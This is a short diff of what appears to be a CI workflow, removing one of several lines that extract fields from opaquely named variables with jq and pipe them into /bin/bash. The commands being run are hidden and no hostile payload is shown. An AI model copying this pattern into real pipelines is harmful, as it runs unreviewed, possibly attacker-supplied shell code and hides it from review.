@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$gdi5132" | jq -r .ioty960 | /bin/bash
           printf '%s' "$p41040" | jq -r .x116 | /bin/bash
           echo $i755 | jq -r .qg50 | /bin/bash
-          printf '%s' "$kq10996" | jq -r .e68 | /bin/bash
           printf '%s' "$nvq45" | jq -r .y21163 | /bin/bash
 
       - name: Upload output
